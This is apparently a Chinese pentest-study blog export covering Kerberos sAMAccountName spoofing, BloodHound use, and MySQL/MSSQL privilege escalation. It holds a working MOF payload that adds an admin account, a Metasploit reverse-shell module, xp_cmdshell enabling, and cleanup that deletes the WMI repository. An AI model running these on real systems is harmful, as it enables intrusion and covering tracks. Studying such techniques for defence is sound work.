<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> addspn.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&#x27;xie.com\WIN7$&#x27;</span> -<span class="hljs-keyword">P</span> 哈希值 -t <span class="hljs-string">&#x27;win10$&#x27;</span> -<span class="hljs-keyword">c</span> 域控ip<br></code></pre></td></tr></table></figure>



<p>然后和以前一样</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm">将机器账户的saMAccountName属性修改为域控名<br><br>以机器账户身份申请TGT<br><br>导入TGT<br><br>恢复saMAccountName属性<br><br>申请<span class="hljs-keyword">ST</span><br><br>导入<span class="hljs-keyword">ST</span><br></code></pre></td></tr></table></figure>







<p><strong>如果获取了将机器加入域的用户权限</strong></p>
<p>前提，是tom将WIN7加入的域</p>
<p>现在我们获得了tom的权限</p>
<p>从上面可以知道，我们使用有权限的WIN7，唯一用的就是WIN7$的hash</p>
<p>现在就算没有win7的权限，我们只需要想办法，把WIN7$的hash弄出来就行</p>
<p>我们现在拥有tom这个特殊账户的权限，可以考虑用tom拿到hash</p>
<p>通过mimikatz，利用SAMR协议，修改win7$密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">lsadump::SETNTLM /server:域控ip /user:win7$ /password:123456<br></code></pre></td></tr></table></figure>



<p>获取到密码之后，用法就和上面一样了</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>主要是两个补丁KB5008102、KB5008308</p>
<p><strong>KB5008102</strong></p>
<p>主要是检查非管理员权限的用户创建或者修改saMAccountName属性和UserAccountControl属性，需要进行检查</p>
<p><strong>KB5008380</strong></p>
<p>在TGS_REP阶段，会将TGT中的pac和TGS_REQ中的pac进行检查，查看两个pac的信息是否相同</p>
<h1 id="整体总结"><a href="#整体总结" class="headerlink" title="整体总结"></a>整体总结</h1><p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230304150501801.png"  ><span class="image-caption">image-20230304150501801</span></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
        <tag>Kerberos</tag>
      </tags>
  </entry>
  <entry>
    <title>BloodHound</title>
    <url>/2023/03/02/BloodHound/</url>
    <content><![CDATA[<h1 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h1><p><font color='red'>使用可视化的图形来展示活动目录之间的关系</font></p>
<p>通过图形，将域用户、计算机、组、对话、ACL之间的关系展现出来</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先需要安装<font color='red'>java环境</font></p>
<p>其次需要安装<font color='cornflowerblue'>Neo4j数据库</font></p>
<p>最后运行bloodhound</p>
<p>安装Neo4j数据库</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install neo4j<br></code></pre></td></tr></table></figure>



<p>启动数据库</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh">neo4j <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure>



<p>然后浏览器访问，默认账号密码是neo4j，登陆之后要求重置密码</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">7474</span><br></code></pre></td></tr></table></figure>



<p>下载bloodhound</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BloodHoundAD/</span>BloodHound/releases<br></code></pre></td></tr></table></figure>



<p>解压之后执行</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./BloodHound</span> <span class="hljs-params">--no-sandbox</span><br></code></pre></td></tr></table></figure>



<p>然后会弹出弹窗，输入之前数据库的账号密码即可</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230228103735813.png"  ><span class="image-caption">image-20230228103735813</span></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>bloodhound</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230228114729306.png"  ><span class="image-caption">image-20230228114729306</span></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>两种方法</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">一种是powershell脚本<span class="hljs-keyword">sharphound.ps1</span><br><span class="hljs-keyword"></span><br>powershell -exec <span class="hljs-keyword">bypass </span>-command <span class="hljs-string">&quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</span><br><br>一种是<span class="hljs-keyword">sharphound.exe</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">SharpHound.exe </span>-c all<br></code></pre></td></tr></table></figure>



<p>运行之后会生成ZIP压缩包</p>
<p><font color='cornflowerblue'>把压缩包导入bloodhound即可</font></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库提权</title>
    <url>/2023/03/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="常见数据库端口号"><a href="#常见数据库端口号" class="headerlink" title="常见数据库端口号"></a>常见数据库端口号</h2><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MySQL</span>						        <span class="hljs-number">3306</span><br><br><span class="hljs-attribute">SQL</span> Server						<span class="hljs-number">1433</span><br><br><span class="hljs-attribute">Oracle</span>							     <span class="hljs-number">1521</span><br><br><span class="hljs-attribute">pointbase</span>						 <span class="hljs-number">9092</span><br><br><span class="hljs-attribute">DB2</span>									<span class="hljs-number">50000</span><br><br><span class="hljs-attribute">sybase</span>								<span class="hljs-number">5000</span><br><br><span class="hljs-attribute">postgreSQL</span>						<span class="hljs-number">5432</span><br><br><span class="hljs-attribute">mongoDB</span>							<span class="hljs-number">27017</span><br><br><span class="hljs-attribute">redis</span>									<span class="hljs-number">6379</span><br><br><span class="hljs-attribute">memcached</span>						<span class="hljs-number">11211</span><br></code></pre></td></tr></table></figure>



<h2 id="数据库提权的目的"><a href="#数据库提权的目的" class="headerlink" title="数据库提权的目的"></a>数据库提权的目的</h2><p>数据库提权，并不是拿到数据库的root权限，并不是提升数据库用户的权限</p>
<p>而是拿到系统的权限，即system权限</p>
<h2 id="拿到root权限方法"><a href="#拿到root权限方法" class="headerlink" title="拿到root权限方法"></a>拿到root权限方法</h2><h3 id="查看配置文件"><a href="#查看配置文件" class="headerlink" title="查看配置文件"></a>查看配置文件</h3><p>最主要的方法</p>
<p>通过查看数据库的配置文件，得到root账号的密码</p>
<p>一般配置文件所在文件夹</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sql</span> <span class="hljs-meta">data</span> inc config conn database <span class="hljs-meta">common</span> <span class="hljs-meta">include</span>等<br></code></pre></td></tr></table></figure>



<p>其次就是查看数据库的存储文件或备份文件</p>
<p>存储文件的后缀一般是    <font color='red'>myd</font></p>
<p>查询存储文件位置</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span>  @@basedir <span class="hljs-keyword">as</span> basePath <span class="hljs-keyword">from</span>  dual <br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230109155241975.png"  ><span class="image-caption">image-20230109155241975</span></p>
<h3 id="本地脚本爆破"><a href="#本地脚本爆破" class="headerlink" title="本地脚本爆破"></a>本地脚本爆破</h3><p>本地爆破脚本网上比较多，一大堆，能不能破解就听天由命咯</p>
<h3 id="远程爆破"><a href="#远程爆破" class="headerlink" title="远程爆破"></a>远程爆破</h3><p>这个实现其实不太现实</p>
<p>它需要开放远程连接，但是敏感的root用户基本上是不会开放远程连接的，只能试试</p>
<h1 id="MYSQL提权"><a href="#MYSQL提权" class="headerlink" title="MYSQL提权"></a>MYSQL提权</h1><h2 id="UDF（user-defined-function）提权"><a href="#UDF（user-defined-function）提权" class="headerlink" title="UDF（user defined function）提权"></a>UDF（user defined function）提权</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>UDF是user defined function的简写，顾名思义是用    用户自定义函数进行提权</p>
<p>用户自定义函数是mysql数据库的一个拓展接口，它支持用户自定义函数的功能</p>
<p>但是自定义的函数，需要以    动态链接    的形式来写出mysql插件，来给mysql使用</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">linux的动态链接文件以<span class="hljs-string">.so</span>结尾<br>windows的动态文件以<span class="hljs-string">.dll</span>结尾<br></code></pre></td></tr></table></figure>



<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原理主要是建立在MySQL的func上，官方的定义是：对认证的用户——只要拥有INSERT和DELETE这两个权限的用户，就可以在任意的数据库下面以MySQL创建一个函数，然后用这个函数去攻击数据库来达到我们的目的</p>
<p>mysql通常是使用管理员权限进行配置，我们通过mysql添加函数，执行的命令，自然是高权限</p>
<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ol>
<li><p><font color='orange'>拿到数据库的root权限，且mysql要有system权限</font></p>
</li>
<li><p><font color='orange'>知道数据库的账号密码</font></p>
</li>
</ol>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">拿到webshell权限之后，读取网站数据库的<br>配置文件<br>存储文件<br>备份文件<br>来获取数据库用户的账号密码<br></code></pre></td></tr></table></figure>



<ol start="3">
<li><font color='orange'>可以远程登陆数据库</font></li>
</ol>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">默认情况下，数据库是不允许远程登陆的，只允许本地登陆<br><br>这种情况，就只能通过拿到本机的高权限rdp远程登录桌面，才能连接<br></code></pre></td></tr></table></figure>



<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">mysql数据库的远程连接设置在	/etc/mysql/my.conf<br>对应设置为	bind-address = <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>只需要把值改为	<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><br>然后给远程登陆的用户赋予权限<br>新建一个用户<br>用	%	来允许任意ip登陆<br>操作如下<br><br>新建一个名为<span class="hljs-keyword">admin</span>的账户<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-keyword">admin</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">option</span>;<br>刷新配置<br>flush <span class="hljs-keyword">privileges</span>;<br><br>设置root账户可以外连<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">option</span>;<br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure>



<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">还可以这样设置远程连接<br>首先登陆数据库<br><br>然后查看<span class="hljs-keyword">user</span>表中的记录<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span><br><br>最后设置任意地址可以连接root<br><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host=<span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span>;<br>flush <span class="hljs-keyword">privileges</span>;<br></code></pre></td></tr></table></figure>



<ol start="4">
<li><font color='orange'>mysql有写入文件的权限</font></li>
</ol>
<p>通过查看<font color='red'><strong>secure_file_priv</strong></font>的值，来确定是否有写入权限</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> @<span class="hljs-symbol">@secure_file_priv</span><br></code></pre></td></tr></table></figure>

<p>值为<font color='cornflowerblue'><strong>NULL</strong></font>，表示不允许导入导出，无法提权</p>
<p>值为<font color='cornflowerblue'><strong>/tmp/</strong></font>，表示只能在tmp目录下导入导出，无法提权</p>
<p>值为空，表示无限制，<font color='red'><strong>可以提权</strong></font></p>
<p>在**<font color='red'>my.ini</font><strong>文件里面修改，</strong><font color='red'>重启mysql数据库才能生效</font>**</p>
<p>在mysql5.5版本以前secure_file_priv的值默认为空，5.5版本以后默认为NULL</p>
<h3 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h3><ol>
<li><font color='orange'>查看数据库版本</font></li>
</ol>
<p>Windows的UDF提权是需要分mysql数据库版本的</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">version</span>()</span>;           <span class="hljs-meta">#查看数据库版本</span><br></code></pre></td></tr></table></figure>



<ol start="2">
<li><font color='orange'>判断存放位置</font></li>
</ol>
<p>当版本小于5.1</p>
<p>需要把udf.dll放在    <font color='red'>C:\windows\system32</font></p>
<p>当版本大于5.1</p>
<p>需要把udf.dll放在    <font color='red'>mysql\lib\plugin</font>，如果没有这个文件夹，就自己创建一个</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> @@basedir           <span class="hljs-meta">#查看mysql数据库安装位置</span><br><br>show variables <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;%plugin%&quot;</span>                 <span class="hljs-meta">#查看plugin位置</span><br><br>show variables <span class="hljs-keyword">like</span> <span class="hljs-string">&quot;%compile%&quot;</span>             <span class="hljs-meta">#查看数据库是32位还是64位</span><br></code></pre></td></tr></table></figure>

<p>然后根据版本上传udf.dll文件</p>
<ol start="3">
<li><font color='orange'>查找dll文件</font></li>
</ol>
<p>udf.dll文件是现成有的</p>
<p>在sqlmap和msf里面都有，根据<font color='red'>数据库版本</font>使用对应的dll文件即可</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">sqlmap<br><br>sqlmap<span class="hljs-string">\data\udf\mysql</span>              <span class="hljs-comment">#dll文件路径</span><br><br>sqlmap里面的dll文件，为了防止被误杀，编码过，需要解码<br>sqlmap自带了解码脚本，在sqlmap<span class="hljs-string">\extra\cloak</span><br>python3 cloak.py -d -i lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll   <span class="hljs-comment">#解码</span><br></code></pre></td></tr></table></figure>



<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">msf<br><br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>data<span class="hljs-regexp">/exploits/my</span>sql/      <span class="hljs-comment">#dll文件路径</span><br><br>无需解码，直接使用<br></code></pre></td></tr></table></figure>



<ol start="4">
<li><font color='orange'>创建自定义函数</font></li>
</ol>
<p>创建sys_eval函数</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp">create function sys_eval returns <span class="hljs-built_in">string</span> soname <span class="hljs-string">&#x27;udf.dll文件名字&#x27;</span>;   <span class="hljs-meta">#创建函数</span><br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> func;           <span class="hljs-meta">#查看函数是否创建成功</span><br></code></pre></td></tr></table></figure>



<p>利用sys_eval函数执行命令</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_eval</span>(<span class="hljs-params"><span class="hljs-string">&#x27;whoami&#x27;</span></span>)</span>;<br></code></pre></td></tr></table></figure>





<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说，最终目的就是</p>
<p>利用udf.dll文件来创建自定义函数</p>
<p>前提是我们可以远程连接数据库，且有一定的权限</p>
<p>还需要注意的是，如果要删除udf文件，首先记得删除函数，再删除文件，不然后续创建可能会起冲突</p>
<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><h3 id="手工提权"><a href="#手工提权" class="headerlink" title="手工提权"></a>手工提权</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>Windows的这个目录下的    nullevt.mof文件</p>
<p>该文件每隔一段时间就会去执行一次</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">c:<span class="hljs-regexp">/windows/</span>system32<span class="hljs-regexp">/wbem/m</span>of/<br></code></pre></td></tr></table></figure>



<h4 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h4><p>只适用于低版本的Windows</p>
<p><strong><font color='cornflowerblue'>xp和server2003</font></strong></p>
<p>对c:/windows/system32/wbem/mof/     <font color='red'><strong>有写权限</strong></font></p>
<h4 id="提权操作-1"><a href="#提权操作-1" class="headerlink" title="提权操作"></a>提权操作</h4><ol>
<li><font color='orange'>找到一个拥有可写权限的目录上传mof文件</font></li>
</ol>
<p>文件内容</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __EventFilter as $EventFilter <br>&#123; <br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>; <br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    Query<span class="hljs-class">Language = &quot;WQL&quot;;</span> <br>&#125;; <br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of ActiveScriptEventConsumer as $Consumer <br>&#123; <br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>; <br>    ScriptText = <br>    <span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user admin admin123!@<span class="hljs-comment"># /add\&quot;)&quot;; </span><br>&#125;; <br><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __FilterToConsumerBinding <br>&#123; <br>    Consumer   = $Consumer; <br>    Filter = $EventFilter; <br>&#125;;<br><br></code></pre></td></tr></table></figure>





<ol start="2">
<li><font color='orange'>将该mof文件复制到c:/windows/system32/wbem/mof/</font></li>
</ol>
<figure class="highlight lasso"><table><tr><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">select</span>  load_file(<span class="hljs-string">&quot;C:/phpstudy/WWW/add_admin.mof&quot;</span>)  <span class="hljs-keyword">into</span>  dumpfile  <span class="hljs-string">&quot;C:/WINDOWS/system32/wbem/mof/add_admin.mof&quot;</span><br></code></pre></td></tr></table></figure>

<p>然后就等待，过一会系统就会自己执行该文件</p>
<p>然后就添加了admin账户</p>
<p>net user查看，发现管理员组多了admin这个账户</p>
<h4 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h4><ol>
<li>关闭 winmgmt 服务</li>
<li>删除mof文件</li>
</ol>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 停止 winmgmt 服务</span><br>net stop winmgmt<br><span class="hljs-comment"># 删除 Repository 文件夹</span><br>rmdir <span class="hljs-regexp">/s /</span>q C:\Windows\system32\wbem\Repository\<br><span class="hljs-comment"># 手动删除 mof 文件</span><br>del C:\Windows\system32\wbem\mof\good\test.mof <span class="hljs-regexp">/F /</span>S<br><span class="hljs-comment"># 删除创建的用户</span><br>net user hacker /<span class="hljs-keyword">delete</span><br><span class="hljs-comment"># 重新启动服务</span><br>net start winmgmt<br></code></pre></td></tr></table></figure>





<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p><strong><font color='red'>在低版本的Windows 2003中，向mof文件夹里面写入特殊的mof文件，即可提权</font></strong></p>
<p>手动MOF提权的缺点是痕迹清理比较麻烦</p>
<h3 id="利用MSF进行MOF提权"><a href="#利用MSF进行MOF提权" class="headerlink" title="利用MSF进行MOF提权"></a>利用MSF进行MOF提权</h3><h4 id="提权操作-2"><a href="#提权操作-2" class="headerlink" title="提权操作"></a>提权操作</h4><p>这个就更简单了，直接利用msf的模块</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams">use exploit/windows/mysql/mysql_mof<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts 192.168.10.17</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">username root</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">password root</span><br>run<br></code></pre></td></tr></table></figure>

<p>也是需要知道数据库高权限用户的，用户名和密码</p>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>msf的mysql提权，提权之后，msf会<font color='cornflowerblue'>自动进行痕迹清理</font></p>
<p>方便高效</p>
<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>windows系统开机时会自动启动一些程序</p>
<p>这些程序是system启动的，所以这些程序都是拥有system权限的</p>
<p>主要思路就是向启动项中写入脚本，bat或vbs都可</p>
<p>利用mysql数据库写入，只是其中一种方法</p>
<p>详细在启动项提权里面</p>
<h1 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h1><h2 id="MSSQL数据库安装"><a href="#MSSQL数据库安装" class="headerlink" title="MSSQL数据库安装"></a>MSSQL数据库安装</h2><p><strong><font color='red'>以2008r2数据库为例</font></strong></p>
<p>下载数据库文件，以<font color='red'>管理员身份</font>运行setup</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113121335871.png"  ><span class="image-caption">image-20230113121335871</span></p>
<p>选择安装</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113121519051.png"  ><span class="image-caption">image-20230113121519051</span></p>
<p>然后一直默认直到，功能全选，目录默认</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113122140067.png"  ><span class="image-caption">image-20230113122140067</span></p>
<p>直到，配置选择system权限</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113122419065.png"  ><span class="image-caption">image-20230113122419065</span></p>
<p>选择混合模式，添加密码，添加当前账户</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113122611060.png"  ><span class="image-caption">image-20230113122611060</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113122713250.png"  ><span class="image-caption">image-20230113122713250</span></p>
<p>然后一直默认下一步，就行，然后就安装完成</p>
<h2 id="MSSQL数据库使用"><a href="#MSSQL数据库使用" class="headerlink" title="MSSQL数据库使用"></a>MSSQL数据库使用</h2><p>找到    <font color='cornflowerblue'><strong>SQL Server Management Studio</strong></font></p>
<p><strong><font color='red'>MSSQL数据库的管理员默认为   sa</font></strong></p>
<p>密码即为我们刚才设置的</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113123745137.png"  ><span class="image-caption">image-20230113123745137</span></p>
<p>连接即可使用</p>
<h2 id="xp-cmdshell提权"><a href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>xp_cmdshell是数据库中可以执行系统命令的组件，可以利用该组件运行系统命令</p>
<p>xp_cmdshell是数据库系统存储过程，高权限的存储过程可以遍历和执行命令，xp_cmdshell就是可以任意执行系统命令的存储过程</p>
<h3 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h3><p>xp_cmdshell在<font color='red'><strong>MSSQL2005之后是关闭的</strong></font></p>
<p>但是</p>
<p>只要拥有数据库高权限，是可以手动开启的</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>            <br>RECONFIGURE<span class="hljs-comment">;</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>RECONFIGURE<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>



<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>首先用高权限用户连接数据库，<font color='red'><strong>默认是可以远程连接的</strong></font></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113130828175.png"  ><span class="image-caption">image-20230113130828175</span></p>
<p>连接成功</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113130951367.png"  ><span class="image-caption">image-20230113130951367</span></p>
<p>首先是<font color='cornflowerblue'>查看是否存在</font>xp_cmdshell，因为它是有可能被删除</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*)<span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype = <span class="hljs-string">&#x27;x&#x27;</span> and name = <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>;    <span class="hljs-meta">#返回1则存在</span><br></code></pre></td></tr></table></figure>



<p>删除之后，也是可以恢复的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> master.sys.sp_addextendedproc <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-string">&#x27;C:\Program Files\Microsoft SQL</span><br><span class="hljs-string">Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></code></pre></td></tr></table></figure>



<p>然后就是<font color='orange'>启用</font>xp_cmdshell</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">EXEC</span> sp_configure &#x27;<span class="hljs-keyword">show</span> advanced options&#x27;, <span class="hljs-number">1</span>;    <span class="hljs-meta">#允许修改高级参数</span><br>RECONFIGURE;<br><span class="hljs-built_in">EXEC</span> sp_configure &#x27;xp_cmdshell&#x27;, <span class="hljs-number">1</span>;            <span class="hljs-meta">#开启xp_cmdshell</span><br>RECONFIGURE;<br></code></pre></td></tr></table></figure>



<p>未开启</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113131903948.png"  ><span class="image-caption">image-20230113131903948</span></p>
<p>开启</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113132031880.png"  ><span class="image-caption">image-20230113132031880</span></p>
<p>关闭xp_cmdshell命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, 1;<br>reconfigure;<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, 0;<br>reconfigure;<br></code></pre></td></tr></table></figure>



<p>开启之后，就可以用xp_cmdshell执行命令，此时是以system权限执行命令的</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">EXEC master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_cmdshell</span> <span class="hljs-string">&#x27;命令&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230113132125346.png"  ><span class="image-caption">image-20230113132125346</span></p>
<p>提权成功</p>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>总的来说，这种提权方式，就是用xp_cmdshell来执行命令</p>
<p>所有的操作都是围绕开启xp_cmdshell这个组件来展开的</p>
<h2 id="sp-oacreate提权"><a href="#sp-oacreate提权" class="headerlink" title="sp_oacreate提权"></a>sp_oacreate提权</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>sp_oacreate用来调用<font color='red'>OLE对象</font>，利用OLE对象的run方法执行系统命令</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>数据库本身具有高权限，因为需要调用COM组件</p>
<p>大多用于xp_cmdshell组件被删除，不能使用xp_cmdshell方法</p>
